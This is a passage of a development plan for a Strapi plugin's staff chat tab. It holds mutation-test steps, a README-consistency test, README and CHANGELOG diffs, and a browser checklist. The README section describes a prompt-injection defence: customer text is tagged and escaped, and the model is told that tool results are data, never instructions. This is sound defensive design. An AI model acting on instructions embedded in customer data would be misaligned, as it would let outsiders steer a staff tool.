In the first-load effect in `AssistantProvider.tsx`, reopen the most recent chat even when staff have begun: delete `!acted.current && `.

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `saved chats > does not reopen the most recent chat over a turn that failed while the list was loading: staff have begun, though nothing of it is left in the chat`.

In `deleteChat` in `AssistantProvider.tsx`, treat a 404 as a failure: replace `if (!isNotFound(error)) {` with `if (true) {`.

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `saved chats > deleting > takes the row out when the chat was already gone: it is deleted all the same`.

In `isChatAnswer` in `admin/src/conversations.ts`, refuse a chat with no messages: replace `Array.isArray((value.conversation as unknown as SavedChat).messages)` with `((value.conversation as unknown as SavedChat).messages ?? []).length > 0`.

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `saved chats > opens a saved chat that has no messages, as one the server could not read, as an empty chat, and saves the next turn into it`.

In `AskTab.tsx`, show the problem with the saved chats before a turn's error: write `{(history.error ?? notice?.text) && <ErrorBox>{history.error ?? notice?.text}</ErrorBox>}` in place of the line that has `notice?.text ?? history.error`.

Run: `npm test -- test/unit/ask-tab.test.tsx`
Expected: FAIL, among others: `saved chats > when a call to the saved chats fails > shows a turn's error before a problem with the saved chats, when both are there`.

- [ ] **Step 11: Commit**

From `/Users/paul/work/maison-demo`:

```bash
git add strapi/src/plugins/maison/admin/src/components/assistant/AskTab.tsx strapi/src/plugins/maison/admin/src/components/assistant/AssistantProvider.tsx strapi/src/plugins/maison/admin/src/components/assistant/ChatArea.tsx strapi/src/plugins/maison/admin/src/components/assistant/ConversationSidebar.tsx strapi/src/plugins/maison/admin/src/conversations.ts strapi/src/plugins/maison/test/unit/ask-tab.test.tsx strapi/src/plugins/maison/test/unit/chat-area.test.tsx strapi/src/plugins/maison/test/unit/conversation-sidebar.test.tsx strapi/src/plugins/maison/test/unit/conversations-admin.test.ts
git commit -m "maison: saved chats in the Ask tab: the sidebar, saving after each turn, and opening, deleting and starting chats" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>" -- strapi/src/plugins/maison/admin/src/components/assistant/AskTab.tsx strapi/src/plugins/maison/admin/src/components/assistant/AssistantProvider.tsx strapi/src/plugins/maison/admin/src/components/assistant/ChatArea.tsx strapi/src/plugins/maison/admin/src/components/assistant/ConversationSidebar.tsx strapi/src/plugins/maison/admin/src/conversations.ts strapi/src/plugins/maison/test/unit/ask-tab.test.tsx strapi/src/plugins/maison/test/unit/chat-area.test.tsx strapi/src/plugins/maison/test/unit/conversation-sidebar.test.tsx strapi/src/plugins/maison/test/unit/conversations-admin.test.ts
```


---

### Task 8: The README, the CHANGELOG and Paul's browser checklist

**Group:** Step 1c, the last task. After this task the docs say what the Ask tab is and does, a test holds the facts that are written twice to the code, and Paul has a checklist for the browser.

Read first: the spec's rebuild section (all of it); `README.md` (the Features list, Requirements, the Configuration table, "The admin page" and "Development") and `CHANGELOG.md` (the format of the newest entry); the code facts the new text states: `server/src/constants.ts` (`ASSISTANT_LIMITS`, `SAVED_CHATS`, `ACTION`), `server/src/assistant/tools.ts` (`READ_TOOL_NAMES`, `TOOL_LABELS`), `server/src/assistant/errors.ts` and `admin/src/assistant.ts` (the staff texts, `STARTERS`), and `server/src/routes/index.ts`.

**Files:**
- Modify: `README.md`, `CHANGELOG.md`
- Test: create `test/unit/readme-ask.test.ts`

**Interfaces:**
- Consumes (tests only): `READ_TOOL_NAMES` and `TOOL_LABELS` (`server/src/assistant/tools.ts`), `ACTION`, `ASSISTANT_LIMITS` and `SAVED_CHATS` (`server/src/constants.ts`), and `routes` (`server/src/routes`).
- Produces: nothing for later tasks. The README gains the section "## The Ask tab" between "The admin page" and "The Homepage widgets".
- Decisions made here: the README and the CHANGELOG have nothing on the Ask tab yet (the first plan's docs come last), so this task writes them for the Ask tab as it is after the rebuild: the permission, `aiChatModel`, the screen, the saved chats, the tools, what the model sees, the limits and errors, and the routes. The first plan's Task 16 extends this section with the draft tools and the dialogs, and does not write a second one. `docs/architecture.md` (which says the page has three tabs) and `docs/production.md` are not changed here: the first plan's Task 16 owns the first, and nothing touches the second until Paul approves. The README states only what the code does, and `readme-ask.test.ts` holds the facts that are written twice (the tools and their labels, the permission and settings, the seven routes, every limit, the dashes rule) so a change to one that forgets the other fails.

**Review Focus covered here:** none of the five is a docs concern, and each is pinned by a test in Tasks 2 and 4 to 7. Paul's checklist below has a browser step for the ones a person can see: hostile text (steps 5 and 7), another admin's chats and a chat that is gone (step 9), Stop and New chat during an answer (steps 8 and 9), and Japanese and wide content (steps 7 and 10).

- [ ] **Step 1: Write the failing test**

`readme-ask.test.ts` reads `README.md` and `CHANGELOG.md` and checks the section against the code. It also holds the writing rule for the two files: no em dash and no en dash.

Create `test/unit/readme-ask.test.ts`:

```ts
import { readFileSync } from 'node:fs';
import { describe, expect, it } from 'vitest';
import { READ_TOOL_NAMES, TOOL_LABELS } from '../../server/src/assistant/tools';
import { ACTION, ASSISTANT_LIMITS, SAVED_CHATS } from '../../server/src/constants';
import routes from '../../server/src/routes';

/**
 * The README's section on the Ask tab says what the code does. These hold the facts that are written twice, the tools, the routes, the
 * limits and the names of the settings, to the code that has them, so a change to one that forgets the other fails here.
 */
const readme = readFileSync(new URL('../../README.md', import.meta.url), 'utf8');
const changelog = readFileSync(new URL('../../CHANGELOG.md', import.meta.url), 'utf8');
const start = readme.indexOf('## The Ask tab');
const section = readme.slice(start, readme.indexOf('## The Homepage widgets'));

describe("the README's section on the Ask tab", () => {
  it('is there, between the admin page and the Homepage widgets', () => {
    expect(start).toBeGreaterThan(readme.indexOf('## The admin page'));
    expect(section.length).toBeGreaterThan(2000);
    for (const heading of ['### The screen', '### Saved chats', '### Tools', '### What the model sees', '### Limits and errors', '### Routes']) expect(section, heading).toContain(heading);
  });

  it('names every read tool with its label, in the table of tools', () => {
    for (const name of READ_TOOL_NAMES) expect(section, name).toContain(`| \`${name}\` |`);
    for (const label of Object.values(TOOL_LABELS)) expect(section, label).toContain(`| ${label} |`);
  });

  it('names the permission and the settings, and the default model', () => {
    expect(section).toContain(`"Use the Maison assistant" (\`${ACTION.assistantUse}\`)`);
    expect(section).toContain('`aiChatModel` (`AI_CHAT_MODEL`), `claude-sonnet-5-5` by default');
    expect(section).toContain('`AI_API_KEY`');
  });

  it('lists every route of the assistant and of the saved chats, as the server serves them', () => {
    const served = routes.admin.routes.filter((route) => route.handler.startsWith('assistant.') || route.handler.startsWith('conversations.'));
    expect(served).toHaveLength(7);
    for (const { method, path } of served) expect(section, `${method} ${path}`).toContain(`\`${method} ${path}\``);
  });

  it('gives the limits as the code has them', () => {
    expect(section).toContain(`| Messages from you in one chat | ${ASSISTANT_LIMITS.staffMessages}. The ${ASSISTANT_LIMITS.staffMessages + 1}st is refused`);
    expect(section).toContain(`| Model turns for one answer | ${ASSISTANT_LIMITS.modelTurns}. After that, "The assistant stopped after ${ASSISTANT_LIMITS.modelTurns} steps.`);
    expect(section).toContain(`| Time for one answer | ${ASSISTANT_LIMITS.deadlineMs / 1000} seconds |`);
    expect(section).toContain(`| Output of one model turn | ${ASSISTANT_LIMITS.maxTokens.toLocaleString('en-US')} tokens`);
    expect(section).toContain(`A list answer has at most ${ASSISTANT_LIMITS.listRows} rows`);
    expect(section).toContain(`cut to ${ASSISTANT_LIMITS.listTextChars} characters`);
    expect(section).toContain(`at most ${SAVED_CHATS.listRows}`);
    expect(section).toContain(`cut to ${SAVED_CHATS.titleChars} characters`);
  });

  it('has no em dash and no en dash, and the README has none either', () => {
    expect(section).not.toMatch(/[\u2013\u2014]/);
    expect(readme).not.toMatch(/[\u2013\u2014]/);
  });
});

describe('the README outside that section', () => {
  it('lists aiChatModel in the configuration table, with its default', () => {
    expect(readme).toMatch(/^\| `aiChatModel` \| `claude-sonnet-5-5` \|/m);
  });

  it('names the Ask tab among the admin page\'s tabs, and says Reset demo activity deletes the saved chats', () => {
    expect(readme).toContain('It has up to four tabs');
    expect(readme).toContain("every admin's saved Ask chats");
  });
});

describe('the CHANGELOG', () => {
  it('has an entry for the Ask tab, with its permission, its setting and its routes', () => {
    expect(changelog).toContain('**The Ask tab: a chat for staff on the Maison page.**');
    expect(changelog).toContain(ACTION.assistantUse);
    expect(changelog).toContain('`AI_CHAT_MODEL`');
    for (const route of ['GET /maison/assistant/status', 'POST /maison/assistant/chat']) expect(changelog, route).toContain(route);
    expect(changelog).toContain('`plugin::maison.conversation`');
  });

  it('has no em dash and no en dash', () => {
    expect(changelog).not.toMatch(/[\u2013\u2014]/);
  });
});
```

- [ ] **Step 2: Run it to see it fail**

Run: `npm test -- test/unit/readme-ask.test.ts`
Expected: FAIL, `Test Files  1 failed (1)` and `Tests  8 failed | 2 passed (10)`. The README has no section on the Ask tab, and the CHANGELOG has no entry for it.

- [ ] **Step 3: Update the README outside the new section**

`README.md`: the Features list, Requirements, the Configuration table (`aiChatModel`, and what `disabledTools` does for the Ask tab), "The admin page" (four tabs, Demo data hidden on Ask, what Reset demo activity deletes), and the Development line for `npm test`.

````diff
@@
 - **Customer questions for staff:** when the concierge can't answer, Strapi records the question, staff let the customer know or answer on LINE in their own name, and an answer can become product knowledge ([Customer questions](#customer-questions))
 - **Customer inquiries:** every concierge turn is recorded, a model labels it in the background, and staff work the queues on the Maison page and reply on LINE ([Customer inquiries](#customer-inquiries))
 - **Customer identity comes from sign-in, never from the model**, through [strapi-oauth-mcp-manager](https://github.com/PaulBratslavsky/strapi-oauth-mcp-manager) 1.1 and LINE
+- **The Ask tab:** a chat for staff on the Maison page that looks up requests, questions, inquiries and the catalog, answers in Markdown with tables, shows each lookup in a box, and saves each admin's chats ([The Ask tab](#the-ask-tab))
 - **A live requests board and demo data** in the admin panel, with content in Japanese and English
 
 Maison is fictional. The plugin uses no real brand's names, products or images.
@@
 - Node 22.12 or later: the AI SDK that labels inquiries is an ES module, which Strapi loads with `require()`
 - For the customer tools and the customer routes, strapi-oauth-mcp-manager 1.1 with LINE sign-in configured. Without it, those tools answer `not_signed_in` and those routes answer 503.
 - For the admin chat, strapi-plugin-tanstack-ai 1.6 with its chat configured. Maison needs no setup for it: the chat finds Maison's tools by itself.
+- For the Ask tab, an Anthropic API key in `AI_API_KEY`, with `AI_PROVIDER` unset or `anthropic` ([The Ask tab](#the-ask-tab))
 
 ## Install
 
@@
 | `defaultLocale` | `ja` | Content language when a tool call doesn't pass `locale` (`ja` or `en`) |
 | `maxOpenRequestsPerCustomer` | `3` | Unconfirmed future requests a customer may have |
 | `houseName` | `{ ja: 'メゾン', en: 'Maison' }` | Header of the LINE confirmation, in the visit's language |
-| `disabledTools` | `[]` | Tool names to leave out of MCP and the admin chat |
+| `disabledTools` | `[]` | Tool names to leave out of MCP and the admin chat. In the Ask tab it removes the catalog tools it names (`search_knowledge`, `search_products` and `view_product`) and affects no other tool. |
 | `lineChannelAccessToken` | `null` | The channel access token of your LINE Messaging API channel, which Strapi sends confirmations and staff's answers to customer questions with: `env('LINE_CHANNEL_ACCESS_TOKEN', null)`. Without it, Strapi sends none. An empty value counts as not set. |
 | `lineApiBaseUrl` | `https://api.line.me` | Where Strapi sends them. Any https URL, or `http://127.0.0.1:<port>` and `http://localhost:<port>` for a stand-in in tests. No trailing slash. |
 | `aiProvider` | `anthropic` | The provider of the model that labels inquiries: `anthropic`, `openai` or `openai-compatible`, which is any server that speaks OpenAI's format, such as Ollama, vLLM or LM Studio: `env('AI_PROVIDER', '')`. An empty value counts as not set. |
 | `aiModel` | the provider's own | A model ID: `env('AI_MODEL', '')`. Without one, it's `claude-haiku-4-5-20251001` for `anthropic`, `gpt-5-mini` for `openai` and `llama3.1` for `openai-compatible`. |
+| `aiChatModel` | `claude-sonnet-5-5` | The model of the Ask tab's chat, an Anthropic model ID: `env('AI_CHAT_MODEL', '')`. It is not `aiModel`, which labels inquiries. The chat uses `aiApiKey`, and is ready only when `aiProvider` is `anthropic` ([The Ask tab](#the-ask-tab)). An empty value counts as not set. |
 | `aiApiKey` | `null` | The provider's API key: `env('AI_API_KEY', '')`. Without it, and for `openai-compatible` without `aiBaseUrl`, labelling is off ([Labelling](#labelling)). |
 | `aiBaseUrl` | `null` | Where an `openai-compatible` server answers, such as `http://127.0.0.1:11434/v1` for Ollama: `env('AI_BASE_URL', '')`. An http or https URL, with no trailing slash. |
 | `demoLineUserId` | `null` | Optional. Your own LINE user ID, `U` and 32 lowercase hex characters: `env('MAISON_DEMO_LINE_USER_ID', '')`. With it, [Load demo activity](#load-demo-activity) gives your LINE account one waiting request, one open question and one open complaint, so confirming and replying send real LINE messages to your phone. Any other value is ignored, with a warning at boot that names the setting and never the value, and the demo activity goes to made-up customers only. Never logged, and masked in the admin like every customer, with a "Your LINE" label next to your own rows. An empty value counts as not set. |
@@
 
 ## The admin page
 
-**Maison** in the admin menu is shown to admins with "MCP: review appointment requests", "Read customer questions", "Review customer inquiries" or "Load and reset demo data". It has up to three tabs, each shown to the admins who may see what is in it, and **Demo data** below them. A tab's label says how many are waiting in it, so staff who land on one see where the work is: **Requests 3** for the requests waiting for staff, **Questions 2** for the open and taken questions, and **Inquiries 2** for the inquiries in Needs an answer. A tab with nothing waiting has no number. The numbers refresh every 5 seconds, whichever tab is open, and at once after an action. The page opens on the first tab the admin may see, or on the one its address names: `/plugins/maison?tab=inquiries`, `?tab=questions` or `?tab=requests`, when the admin may see that tab. Picking a tab puts it in the address.
+**Maison** in the admin menu is shown to admins with "MCP: review appointment requests", "Read customer questions", "Review customer inquiries" or "Load and reset demo data". It has up to four tabs, each shown to the admins who may see what is in it, and **Demo data** below them, except on **Ask**, which fills the page. A tab's label says how many are waiting in it, so staff who land on one see where the work is: **Requests 3** for the requests waiting for staff, **Questions 2** for the open and taken questions, and **Inquiries 2** for the inquiries in Needs an answer. A tab with nothing waiting has no number. The numbers refresh every 5 seconds, whichever tab is open, and at once after an action. The page opens on the first tab the admin may see, or on the one its address names: `/plugins/maison?tab=inquiries`, `?tab=questions` or `?tab=requests`, when the admin may see that tab. Picking a tab puts it in the address.
 - **Requests**, for admins with "MCP: review appointment requests": the Homepage widget's three cards (waiting for staff, confirmed and upcoming, LINE sent), then a board that refreshes every 5 seconds. You can filter it to requests waiting for staff, confirmed ones, or all. Each row shows the customer's note. Admins with "MCP: confirm appointment requests" get a **Confirm** button on requests whose visit is still ahead, and the cards update as soon as they confirm. They also get **Send again** on confirmed requests whose LINE column says "not sent", until the visit is over ([Send again](#send-again)). A made-up demo customer's request says "demo customer" in grey, and has no Send again: Strapi sends those customers nothing.
 - **Questions**, for admins with "Read customer questions": the questions the concierge handed to staff, with **Let them know** and **Answer** for admins with "Answer customer questions on LINE" ([Customer questions](#customer-questions)).
 - **Inquiries**, for admins with "Review customer inquiries": every concierge turn, in queues, with **Reply on LINE**, **Close**, **Change label** and **Label again** for admins with "Reply to customer inquiries on LINE" ([Customer inquiries](#customer-inquiries)).
-- **Demo data:** **Load demo catalog**, **Load demo activity** (below) and **Reset demo activity**, which deletes every appointment, notification, question and inquiry, and the product knowledge entries staff added by answering questions.
+- **Ask**, for admins with "Use the Maison assistant": a chat that looks things up for staff, with saved chats ([The Ask tab](#the-ask-tab)).
+- **Demo data:** **Load demo catalog**, **Load demo activity** (below) and **Reset demo activity**, which deletes every appointment, notification, question and inquiry, every admin's saved Ask chats, and the product knowledge entries staff added by answering questions.
 
 ### Load demo activity
 
@@
 ## Development
 
 ```bash
-npm test                    # unit tests (vitest)
+npm test                    # unit tests and component tests (vitest, with jsdom and Testing Library for the components)
 npm run test:ts:back        # type-check the server
 npm run test:ts:front       # type-check the admin
 npm run test:live           # labelling with a real model, skipped without AI_API_KEY (or, for openai-compatible, AI_BASE_URL)
````

- [ ] **Step 4: Write the README section on the Ask tab**

Add the section "## The Ask tab" in `README.md`, after "The admin page" and its "Load demo activity" part, and before "## The Homepage widgets". It is written for staff and for whoever runs the plugin. The tables of tools, limits and errors are held to the code by the test above.

```diff
@@
 
 These answer `200` with `status: "demo"`, and the page shows an info notice. A `demo` outcome is never pending (`pending_confirmations` lists none), and never counts as "LINE sent". The LINE quota line counts what LINE itself reports, so a demo outcome never shows there.
 
+## The Ask tab
+
+**Ask** is the Maison page's fourth tab, a chat for staff. It looks things up and summarizes them: visit requests, the questions the concierge handed to staff, inquiries, and the catalog. It never sends, confirms, answers, closes or relabels anything. Staff do that with the page's own buttons.
+
+- **Who sees it:** admins whose role holds "Use the Maison assistant" (`plugin::maison.assistant.use`). Super Admin has it. The permission adds the tab and nothing else: the page itself still opens only for admins who review requests, read questions, view inquiries or manage the demo data.
+- **What it needs:** an Anthropic API key in `AI_API_KEY`, with `AI_PROVIDER` unset or `anthropic`. Without one, the tab shows "The assistant isn't set up", the reason and **Check again**, and no text box. Set the key, restart Strapi, and press **Check again**.
+- **Which model:** `aiChatModel` (`AI_CHAT_MODEL`), `claude-sonnet-5-5` by default. It is not `aiModel`, which labels inquiries. The model's ID is in a badge in the top bar.
+- **How it calls the model:** only through TanStack AI. The server runs `chat()` from `@tanstack/ai` with the Anthropic adapter, and the page runs `useChat` from `@tanstack/ai-react`. The four TanStack AI packages are pinned to exact versions (0.52.3, 0.18.3, 0.22.4 and 0.29.2), because a range lets npm install two copies of the SDK side by side.
+
+### The screen
+
+The tab is one chat area that fills the height under the page's header and tabs, so the page does not scroll while Ask is open, and the Demo data block is hidden there. Only the message list scrolls, and it follows the newest message only while you are at the bottom.
+- **The top bar:** **History** opens the saved chats. **Tools (N)** opens a read-only list of the tools your chat has, each with a label, one line about it and its name. A role that may read less sees fewer. A badge names the model. **New chat** starts an empty chat. When the chat is too long to go on, the button also shows the words "New chat".
+- **Messages:** your messages are on the right, the assistant's on the left with its avatar. Answers are Markdown: paragraphs, lists, tables, code and quotes. Images are not drawn. Only `http:` and `https:` links are links, and they open in a new tab. Raw HTML shows as text.
+- **Tool boxes:** each lookup is a box in the answer, in the order it happened, closed at first. Its header says `Tool: list_requests` and then a spinner, "3 results" (or "1 result", or "done" for a tool with nothing to count), or "failed". Opened, it shows the result as JSON with the customer-text tags taken out and customers still masked. A failed box is marked: its border takes the error colour, its header says "failed" in the error colour, and its body shows the tool's own message.
+- **Waiting:** three dots show while the assistant starts to answer, and "Working on it…" shows under the boxes while a tool runs.
+- **The text box:** one line, growing to six. Enter sends, Shift+Enter adds a line, and the Enter that confirms a Japanese conversion sends nothing. **Send** and **Stop** sit side by side, so a double click on Send never stops an answer.
+- **Starters:** with no messages, three suggestions: "What are customers asking about today?", "Any complaints this week?" and "Which visits are waiting for staff?"
+
+### Saved chats
+
+Each admin's chats are saved for them, and only they can read them.
+- **When it saves:** after each turn ends, however it ends. A cut-off tool call or a turn that failed before anything came back is taken out first, so a reopened chat never shows a spinner.
+- **The sidebar:** **History** opens it. It lists your chats, newest first, at most 100, each with a trash button that deletes the chat at once. While an answer comes, its rows, **New chat** and the trash buttons are off.
+- **When the page opens:** once the assistant is ready, the list loads and the most recent chat reopens, so the Ask tab shows it. With no saved chat, the empty chat shows. Going to another tab and back keeps the chat as it was.
+- **New chat** keeps the old chat in the sidebar, and the next turn saves a chat of its own. What you typed and did not send stays in the box.
+- **The title** is your first message, on one line, cut to 80 characters.
+- **Where it lives:** the content type `plugin::maison.conversation` (table `maison_conversations`), hidden from the Content Manager and the Content-Type Builder. A chat is stored as `{ v: 1, messages }`, with every key of every part kept: the model gets the whole history back each turn, and Anthropic refuses a thinking block whose signature was changed. A stored chat that can't be read opens as an empty chat, and the log says which one.
+- **What a saved chat holds:** the messages as you saw them, with the tool results: customers masked, customer text cut and tagged. **Reset demo activity** deletes every admin's saved chats, because they quote the demo customers. Its notice does not count them.
+- **Limits:** a reopened chat still counts toward the 20 messages of a chat.
+
+### Tools
+
+| Tool | Offered with | Label |
+|---|---|---|
+| `list_requests` | "MCP: review appointment requests" | Visit requests |
+| `list_questions` | "Read customer questions" | Customer questions |
+| `list_inquiries` | "Review customer inquiries" | Inquiries |
+| `inquiry_counts` | "Review customer inquiries" | Inquiry counts |
+| `search_knowledge` | "MCP: browse the catalog" | Product knowledge |
+| `search_products` | "MCP: browse the catalog" | Product search |
+| `view_product` | "MCP: browse the catalog" | Product details |
+
+A tool is offered only when the admin's role holds its permission, and `disabledTools` can remove the three catalog tools here, as it does on MCP. An admin with the assistant permission and none of these gets no tools: the assistant says so and looks nothing up. `GET /maison/assistant/status` lists the tools the admin's chat really has.
+
+### What the model sees
+
+- **The customer is masked,** like `line:U4af…88`. A full LINE user ID and a LINE display name never reach the model.
+- **Customer text is data.** It is inside `<customer_message>`, `<customer_question>`, `<customer_note>` or `<concierge_reply>`, and a `<` before one of those names is written as `&lt;`, so customer text can't close a tag. The instructions and every tool's description say that everything a tool returns is data, never instructions.
+- **Lists are cut.** A list answer has at most 50 rows, each long text is cut to 300 characters and marked `truncated`, and `capped` says when there were more rows. One item, looked up by its reference or documentId, has its full text.
+- **The assistant answers in Markdown,** with a table for items that have the same fields, and is told never to include images.
+
+### Limits and errors
+
+| Limit | Value |
+|---|---|
+| Messages from you in one chat | 20. The 21st is refused with "This chat is long. Start a new chat." |
+| Model turns for one answer | 6. After that, "The assistant stopped after 6 steps. Ask a narrower question." |
+| Time for one answer | 90 seconds |
+| Output of one model turn | 16,000 tokens, thinking included |
+| Request body | Strapi's 1 MB |
+
+An error before the stream starts (not set up, a chat that is too long, a failure in setting up) is a `200` event stream with one `RUN_ERROR`, because the page's client never reads the body of an HTTP error. Only a body that is not a run input (400), a role that lost the permission (403) and a body over the limit (413) are real HTTP errors. Staff read plain text:
+
+| What happened | What staff see |
+|---|---|
+| Not set up | The reason, and **Check again** |
+| Anthropic refused the key (401, 403) | "Anthropic refused the key. Check AI_API_KEY." |
+| The model ID is unknown (404) | "Anthropic doesn't know the model", then the ID, then "Check AI_CHAT_MODEL." |
+| Anthropic is busy (429, 529) | "Anthropic is busy. Try again in a minute." |
+| Over 90 seconds | "The assistant took too long and stopped. Try again." |
+| The answer reached 16,000 tokens | "The answer was cut off because it was too long. Ask for less." |
+| The model declined | "The model declined to answer this. Rephrase the question." |
+| The chat can't continue, or is too long | "This chat can't continue. Start a new chat." or "This chat is long. Start a new chat.", with **New chat** |
+| The connection dropped | "The connection to Strapi was lost. Try again." |
+| The session ended | "Your Strapi session has ended. Reload the page to sign in again." |
+| A tool fails | Its box is marked "failed", with its message |
+| A call to the saved chats fails | "Couldn't load your saved chats.", "Couldn't open that chat.", "Couldn't save this chat." or "Couldn't delete that chat." |
+| Anything else | "Something went wrong. Try again." |
+
+The log has one line for each turn, with the admin's ID, the tools called and how long it took, and never customer text. A model error goes to the log once, with the key taken out, and staff never read the provider's own text.
+
+### Routes
+
+All of them are for admins who hold "Use the Maison assistant", and are served under `/maison`.
+- `GET /assistant/status`: `{ ready: true, model, tools: [{ name, label }] }`, or `{ ready: false, reason }`. Never the key.
+- `POST /assistant/chat`: one turn, streamed. The page sends the whole history each time.
+- `GET /conversations` (the admin's chats, newest first, at most 100, each `{ documentId, title, updatedAt }`) and `POST /conversations` (`{ title, messages }`).
+- `GET /conversations/:documentId`, `PUT /conversations/:documentId` (`{ title, messages }`, either or both) and `DELETE /conversations/:documentId`. A chat that belongs to another admin answers `404`, as an ID nobody has does. A body that is not a chat answers `400` with "This chat could not be saved."
+
+The chat's tests never reach Anthropic: they use a scripted adapter, set through the service's `adapterFor`.
+
 ## The Homepage widgets
 
 **Maison requests** on the admin's Homepage is shown to admins with "MCP: review appointment requests":
```

- [ ] **Step 5: Add the CHANGELOG entry**

`CHANGELOG.md`: the first bullet under "Added" of the newest entry.

```diff
@@
 
 ### Added
 
+- **The Ask tab: a chat for staff on the Maison page.** It looks up requests, customer questions, inquiries and the catalog, and answers in Markdown. It never sends, confirms, answers, closes or relabels anything.
+  - **Who and what.** A new permission, "Use the Maison assistant" (`plugin::maison.assistant.use`, flag `canUse`), which Super Admin has, adds a fourth tab, Ask, last. It needs an Anthropic API key in `AI_API_KEY` with `AI_PROVIDER` unset or `anthropic`. A new setting, `aiChatModel` (`AI_CHAT_MODEL`), names the model, `claude-sonnet-5-5` by default. It is not `aiModel`, which labels inquiries.
+  - **Model calls go only through TanStack AI:** `chat()` from `@tanstack/ai` with the Anthropic adapter on the server, and `useChat` from `@tanstack/ai-react` in the page. The plugin pins the four packages (`@tanstack/ai` 0.52.3, `@tanstack/ai-anthropic` 0.18.3, `@tanstack/ai-react` 0.22.4 and `@tanstack/ai-client` 0.29.2), and `scripts/check-esm-import.mjs` fails a build that loads the SDK statically. It also depends on `react-markdown` ^9.1.0 and `remark-gfm` ^4.0.1. `jsdom`, `@testing-library/react` and `@testing-library/user-event` are dev dependencies, for the component tests.
+  - **Seven read tools,** each offered only when the admin's role allows it: `list_requests`, `list_questions`, `list_inquiries`, `inquiry_counts`, `search_knowledge`, `search_products` and `view_product`. `disabledTools` can remove the three catalog tools here too. The model sees the customer masked and customer text inside `<customer_message>`, `<customer_question>`, `<customer_note>` or `<concierge_reply>`, in lists of at most 50 rows with long text cut to 300 characters. A chat holds at most 20 messages from staff, an answer at most 6 model turns, and a request at most 90 seconds.
+  - **The screen copies strapi-plugin-tanstack-ai 1.6's chat.** The chat area fills the height under the page's header and tabs, and the Demo data block is hidden while Ask is open. A top bar has **History**, **Tools (N)**, a badge with the model and **New chat**. Staff messages are on the right and the assistant's on the left with the Sparkle avatar. Answers are Markdown with tables: images are not drawn, only `http:` and `https:` links are links, and the colours come from the theme, so they show in the dark theme. Each lookup is a tool box in the order it happened, closed at first, with `Tool: <name>` and a spinner, a count or "failed" in its header. Opened, it shows the result as JSON with the customer-text tags taken out. A failed box is marked. The text box grows from one line to six, with Enter to send, Shift+Enter for a line, and no send for the Enter that confirms a Japanese conversion. Send and Stop sit side by side.
+  - **Saved chats.** Each admin's chats are saved, and only they can read them. A turn that ends saves the open chat, with the cleaned messages, one save at a time. When the assistant is ready, the most recent chat reopens. **History** opens a sidebar that lists the admin's chats, newest first, at most 100, with a title of the first message cut to 80 characters, **New chat** and a trash button for each. **New chat** keeps the old chat. While an answer comes, the sidebar's buttons are off. A chat deleted elsewhere is saved again as a new chat.
+  - **Admin routes,** all for "Use the Maison assistant": `GET /maison/assistant/status` (`{ ready, model, tools }`, or `{ ready: false, reason }`), `POST /maison/assistant/chat`, `GET` and `POST /maison/conversations`, and `GET`, `PUT` and `DELETE /maison/conversations/:documentId`. A chat that belongs to another admin answers `404`. The stored body is `{ v: 1, messages }`, checked with zod, and every key of every part is kept: the model gets the whole history back each turn, thinking signatures included.
+  - **A new content type,** `plugin::maison.conversation` (table `maison_conversations`), hidden from the Content Manager and the Content-Type Builder. **Reset demo activity** deletes every admin's saved chats, and its notice does not count them.
+  - **Errors reach staff as plain text** from the server, and the log has one line for each turn: the admin's ID, the tools called and how long it took.
 - **Demo customers get no LINE message.** Load demo activity's five made-up customers have LINE user IDs that belong to nobody, so LINE refused every message to them, and the board showed red failures on stage. Now `isDemoCustomer(subject)` (in `server/src/domain/demo-activity.ts`, the subjects in `activity.json`) is checked before every push: the confirmation (the publish hook and Send again), Let them know, Answer and Reply on LINE skip the push for them, with or without a token, and record the new outcome `demo`, with the detail "Demo customer: no LINE message". Everything else the action does still happens.
   - `notification.outcome`, `question.lineOutcome` and `inquiry.lineOutcome` take `demo`. Enumerations are stored as text, so the database needs no change.
   - The actions answer 200 with `status: "demo"`. The board's LINE column says "demo customer" in grey, with no Send again, and Confirm's notice says "Confirmed APT-1234. Demo customer: no LINE message." The questions and inquiries show "Demo customer: no LINE message." in grey under their status, never in red. `StaffAppointmentView` and the requests summary's rows have a new `demoCustomer` field, and so does `staffAppointmentOutput`.
```

- [ ] **Step 6: Run the test, then everything**

Run: `npm test -- test/unit/readme-ask.test.ts`
Expected: PASS, `Test Files  1 passed (1)` and `Tests  10 passed (10)`.

No admin or server code changed in this task, so there is no build to run.

Run: `npm test`
Expected: PASS, `Test Files  113 passed (113)` and `Tests  3224 passed (3224)`.

Run: `npm run test:ts:back` and `npm run test:ts:front`
Expected: both finish with no error output.

- [ ] **Step 7: (Paul) Check it in the browser**

Skip this step and say so in the report. This is Paul's checklist for the browser. It needs the build from the last task, Strapi running as usual (port 1338 in Paul's setup), an Anthropic key set in `AI_API_KEY`, and an admin whose role holds "Use the Maison assistant". Open Maison, then the **Ask** tab. Each item says what to do and what is expected.

1. **Height.** The chat area fills the space under the page header and the tabs, and the page has no scrollbar of its own: only the message list scrolls. Try a window about 600 pixels tall and one about 1200 pixels tall. Make the window narrower than 1080 pixels: the area is then 70% of the window's height, at least 420 pixels, and the page may scroll. Open **Requests**: the Demo data block is there (for an admin who may manage demo data). Open **Ask** again: it is gone.
2. **Colours, light and dark.** Switch the admin theme from the profile menu while Ask is open, with a chat on the screen that has a table, a code block and a quote in it. In both themes the bubbles, the avatar, the top bar buttons (rest, hover and open), the tools list, the tool boxes, the code, table and quote backgrounds, the sidebar, the red box and the grey note are readable, and nothing is black on a dark page.
3. **The top bar.** **History** opens a 260 pixel sidebar and then says "Hide history". **Tools (N)** opens a list headed "Read only", with the line "The assistant looks things up. It never sends, confirms or changes anything.", and for each tool its label, one line and its name. It closes on Escape and on a click outside it. The model badge shows the model ID in capitals, and after half a second of hover its tooltip says "Model". **New chat** is switched off while there is nothing to start over from.
4. **Tools with fewer permissions.** Sign in as an admin whose role holds the assistant permission and "Review customer inquiries" only: the button says **Tools (2)**, and the list has Inquiries and Inquiry counts. With the assistant permission alone: **Tools (0)**, and the list says there are none.
